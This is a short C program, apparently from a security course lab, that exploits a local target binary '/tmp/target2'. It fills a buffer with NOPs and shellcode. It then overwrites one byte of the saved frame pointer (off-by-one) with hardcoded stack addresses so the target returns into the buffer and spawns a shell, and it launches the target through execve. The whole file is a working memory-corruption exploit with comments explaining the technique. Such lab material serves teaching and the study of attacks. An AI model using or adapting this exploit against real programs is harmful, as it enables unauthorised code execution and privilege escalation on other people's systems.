#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 
  char buf[202];
   
  memset(buf, 0x90, 201); //set everything to no ops
    /*
     I used 0xa4 because the last 8 bytes of buf are a4.....ab. so first
     4 bytes will be ebp of foo's frame and its last 4 bytes will be foo's
     eip. this eip will point to the address of buf (return address) and
     execute the shell 
     */
  memset(buf + 200, 0xa4, 1); // set final byte to 8 bytes under FP
  memset(buf + 201, 0x00, 1); //set null char
    
  memcpy(buf, shellcode, strlen(shellcode)); //copy the shell code
  *(unsigned int *) (buf + 192) = 0xbffffdac; //frame pointer
  *(unsigned int *) (buf + 196) = 0xbffffce4; //buf

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
